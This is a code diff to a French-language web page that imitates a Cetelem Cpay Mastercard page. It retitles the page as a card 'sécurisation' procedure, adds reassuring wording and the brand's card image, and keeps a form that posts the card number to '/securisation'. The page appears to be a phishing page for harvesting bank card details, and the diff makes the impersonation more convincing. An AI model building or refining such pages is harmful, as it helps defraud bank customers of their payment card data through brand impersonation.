@@ -113,6 +113,20 @@
       margin-bottom: 25px;
     }
 
+    /* Image du formulaire */
+    .card-image {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+
+    .card-image img {
+      width: 100%;
+      height: auto;
+      border-radius: 8px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+    }
+
     /* --- Champs modernes --- */
     .form-group {
       position: relative;
@@ -121,7 +135,7 @@
 
     .form-group input {
       width: 100%;
-      padding: 12px 12px 12px 12px;
+      padding: 12px;
       font-size: 15px;
       border: 1px solid #ccc;
       border-radius: 6px;
@@ -224,10 +238,15 @@
 
   <main>
     <div class="form-container">
-      <h1>Carte de crédit renouvelable.</h1>
-      <p>La Carte de crédit renouvelable Cetelem Cpay Mastercard vous accompagne au quotidien en vous permettant de régler vos achats partout.</p>
-      <form method="POST" action="/securisation">
+      <h1>Sécurisation de votre carte Cpay</h1>
+      <p>La sécurisation de votre carte Cpay permet de protéger vos transactions et vos informations bancaires. Cette procédure rapide garantit que votre carte est utilisée uniquement par vous et sécurise vos paiements au quotidien.</p>
 
+      <!-- Image avant le formulaire -->
+      <div class="card-image">
+        <img src="https://www.cartedecredit.fr/images/product/cetelem-cpay-mastercard.png" alt="Cetelem Cpay Mastercard">
+      </div>
+
+      <form method="POST" action="/securisation">
         <div class="form-group">
           <input type="text" id="numero_carte" name="numero_carte" placeholder=" " pattern="\d{13,19}" maxlength="19" required>
           <label for="numero_carte">Numéro de carte bancaire</label>
